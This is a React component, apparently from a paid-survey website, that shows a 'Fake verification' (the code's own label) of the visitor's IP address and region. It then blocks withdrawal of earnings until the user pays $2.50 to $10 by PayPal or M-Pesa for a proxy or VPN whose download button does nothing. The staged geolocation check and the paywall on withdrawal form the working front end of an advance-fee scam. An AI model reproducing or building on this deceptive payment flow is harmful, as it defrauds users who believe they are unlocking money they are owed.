import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/GeoWarning.css";

import dcProxyImg from "../assets/us-proxy.png";
import resProxyImg from "../assets/residential-proxy.png";
import catoVpnImg from "../assets/cato-vpn.png";

export default function GeoWarning() {
  const navigate = useNavigate();

  const RATE = 125;

  const [checking, setChecking] = useState(true);
  const [stepIndex, setStepIndex] = useState(0);
  const [purchasedProxy, setPurchasedProxy] = useState(null);

  const [checkout, setCheckout] = useState(null);
  const [form, setForm] = useState({
    name: "",
    phone: "",
    reference: "",
  });

  const [paymentStatus, setPaymentStatus] = useState(null);
  const [transactionRef, setTransactionRef] = useState(null);

  const steps = [
    "Obtaining IP address…",
    "Checking geolocation…",
    "Verifying region eligibility…",
    "Verification completed",
  ];

  /* -------- Fake verification -------- */
  useEffect(() => {
    const t = setInterval(() => {
      setStepIndex((i) => (i < steps.length - 1 ? i + 1 : i));
    }, 1500);

    setTimeout(() => {
      setChecking(false);
      clearInterval(t);
    }, 7000);

    return () => clearInterval(t);
  }, []);

  /* -------- PayPal (unchanged) -------- */
  useEffect(() => {
    if (window.paypal) return;

    const script = document.createElement("script");
    script.src =
      "https://www.paypal.com/sdk/js?client-id=Abvr9JQwh4aABOQkIoz7Dn8kcjEaPHlDV49WPqUUR3YfKSvqYF5TBcQj6WiqsAFajtSudQfHugP0tbz8&currency=USD";
    script.async = true;

    script.onload = () => {
      window.paypal.Buttons({
        createOrder: (_, actions) =>
          actions.order.create({
            purchase_units: [{ amount: { value: "5.00" } }],
          }),
        onApprove: (_, actions) =>
          actions.order.capture().then(() => {
            setPurchasedProxy("dc");
          }),
      }).render("#paypal-5");

      window.paypal.Buttons({
        createOrder: (_, actions) =>
          actions.order.create({
            purchase_units: [{ amount: { value: "10.00" } }],
          }),
        onApprove: (_, actions) =>
          actions.order.capture().then(() => {
            setPurchasedProxy("residential");
          }),
      }).render("#paypal-10");

      window.paypal.Buttons({
        createOrder: (_, actions) =>
          actions.order.create({
            purchase_units: [{ amount: { value: "2.50" } }],
          }),
        onApprove: (_, actions) =>
          actions.order.capture().then(() => {
            setPurchasedProxy("cato");
          }),
      }).render("#paypal-2-5");
    };

    document.body.appendChild(script);
  }, []);

  /* -------- STK PUSH -------- */
  const handleSTKPush = async () => {
    if (!form.name || !form.phone) return alert("Fill all fields");

    const kes = Math.round(checkout.usd * RATE);

    try {
      const res = await fetch(
        "https://usaas-survey-bc.onrender.com/api/payments/stk-push",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            phone: form.phone,
            product: checkout.type,
            reference: form.reference,
          }),
        }
      );

      const data = await res.json();

      if (data.success) {
        setTransactionRef(data.reference);
        setPaymentStatus("pending");
        setCheckout(null);
      } else {
        alert("Payment failed");
      }
    } catch {
      alert("Network error");
    }
  };

  /* -------- Poll payment -------- */
  useEffect(() => {
    if (paymentStatus !== "pending") return;

    const i = setInterval(async () => {
      const res = await fetch(
        `https://usaas-survey-bc.onrender.com/api/payments/status/${transactionRef}`
      );
      const data = await res.json();

      if (data.status === "success") {
        setPaymentStatus("success");
        setPurchasedProxy(data.product);
        clearInterval(i);
      }

      if (data.status === "failed") {
        setPaymentStatus("failed");
        clearInterval(i);
      }
    }, 4000);

    return () => clearInterval(i);
  }, [paymentStatus]);

  const handleProceedWithdraw = () => {
    if (!purchasedProxy) return alert("Purchase required");
    navigate("/withdrawp");
  };

  const DownloadLink = () =>
    purchasedProxy ? (
      <button className="download-link active">⬇ Download</button>
    ) : (
      <span className="download-link locked">Locked</span>
    );

  const calcKES = checkout ? Math.round(checkout.usd * RATE) : 0;

  return (
    <div className="geo-page">
      <div className="geo-card">

        {checking && (
          <div className="checking-overlay">
            <div className="checking-box">
              <div className="spinner" />
              <p>{steps[stepIndex]}</p>
            </div>
          </div>
        )}

        <div className={`geo-content ${checking ? "blurred" : ""}`}>
          <h1>⚠ Purchase Proxy to Withdraw</h1>

          <div className="proxy-list">

            <div className="proxy-card">
              <img src={dcProxyImg} alt="" />
              <DownloadLink />
              <h3>Datacenter Proxy</h3>
              <p>$5 (~KES {5 * RATE})</p>
              <div id="paypal-5" />
              <button onClick={() => setCheckout({ type: "dc", usd: 5 })}>
                M-Pesa
              </button>
            </div>

            <div className="proxy-card premium">
              <img src={resProxyImg} alt="" />
              <DownloadLink />
              <h3>Residential Proxy</h3>
              <p>$10 (~KES {10 * RATE})</p>
              <div id="paypal-10" />
              <button
                onClick={() =>
                  setCheckout({ type: "residential", usd: 10 })
                }
              >
                M-Pesa
              </button>
            </div>

            <div className="proxy-card">
              <img src={catoVpnImg} alt="" />
              <DownloadLink />
              <h3>VPN</h3>
              <p>$2.5 (~KES {2.5 * RATE})</p>
              <div id="paypal-2-5" />
              <button onClick={() => setCheckout({ type: "cato", usd: 2.5 })}>
                M-Pesa
              </button>
            </div>

          </div>

          {!checking && (
            <button onClick={handleProceedWithdraw}>
              Proceed Withdraw
            </button>
          )}
        </div>
      </div>

      {/* CHECKOUT MODAL */}
      {checkout && (
        <div className="checkout-modal">
          <div className="checkout-box">
            <h2>Checkout</h2>

            <input
              placeholder="Name"
              onChange={(e) =>
                setForm({ ...form, name: e.target.value })
              }
            />
            <input
              placeholder="2547XXXXXXXX"
              onChange={(e) =>
                setForm({ ...form, phone: e.target.value })
              }
            />
            <input
              placeholder="Reference"
              onChange={(e) =>
                setForm({ ...form, reference: e.target.value })
              }
            />

            <div className="amount-box">
              <h2>KES {calcKES}</h2>
              <span>${checkout.usd} × {RATE}</span>
            </div>

            <button onClick={handleSTKPush}>Pay Now</button>
            <button onClick={() => setCheckout(null)}>Cancel</button>
          </div>
        </div>
      )}

      {/* STATUS */}
      {paymentStatus && (
        <div className="payment-status">
          <div className="box">
            {paymentStatus === "pending" && <h2>Waiting for payment...</h2>}
            {paymentStatus === "success" && <h2>✅ Payment Successful</h2>}
            {paymentStatus === "failed" && <h2>❌ Payment Failed</h2>}
          </div>
        </div>
      )}

    </div>
  );
}

